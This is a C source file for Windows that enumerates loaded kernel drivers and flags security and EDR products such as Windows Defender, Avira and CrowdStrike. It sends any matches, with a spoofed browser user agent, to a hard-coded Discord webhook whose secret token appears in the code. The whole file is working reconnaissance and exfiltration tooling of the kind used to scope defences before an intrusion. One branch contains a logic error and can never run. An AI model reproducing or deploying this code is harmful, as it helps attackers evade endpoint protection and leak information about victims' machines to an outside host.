#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <psapi.h>
#define ARRAY_SIZE 1024

#pragma comment(lib, "wininet.lib")
void send_to_discord(const char* message) {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            const char* path = "/api/webhooks/1482700291949330676/PumwkMWs-5maNppE4gBj5E7PdPpidwoF-Wz9gTXr-8zTIvYCjG0jI3SU5tUuG3YqOeja";
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
            
            if (hRequest) {
                char json_data[2048];
                snprintf(json_data, sizeof(json_data), "{\"content\": \"%s\"}", message);
                
                const char* headers = "Content-Type: application/json";
                HttpSendRequestA(hRequest, headers, strlen(headers), json_data, strlen(json_data));
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}

int main(void) {
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    char driverName[ARRAY_SIZE];
    char alertMessage[4096] = "Security Drivers Found: "; // Buffer to collect matches

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        // Calculate count AFTER the function fills cbNeeded
        int count = cbNeeded / sizeof(drivers[0]);
        
        for (int i = 0; i < count; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], driverName, sizeof(driverName))) {
                // Check against blacklist
                if (strcmp(driverName, "WdNisDrv.sys") == 0 || strcmp(driverName, "WdFilter.sys") == 0 || 
                    strcmp(driverName, "avguard.sys") == 0 || strcmp(driverName, "crowdstrike.sys") == 0 || 
                    strcmp(driverName, "edr.sys") == 0 || strcmp(driverName, "sentinel.sys") == 0) {
                    
                    printf("!!!!!!!Active: %s\n", driverName);
                    strcat(alertMessage, driverName);
                    strcat(alertMessage, ", ");
                }
            }
        }
        
        // Only send to Discord if we actually found a match
        if (strlen(alertMessage) > 24) { 
            send_to_discord(alertMessage);
        }
	else if(strlen(alertMessage) == 0){
		send_to_discord("Nothing detected!");
	}
    } else {
        printf("EnumDeviceDrivers failed: %lu\n", GetLastError());
    }
    return 0;
}
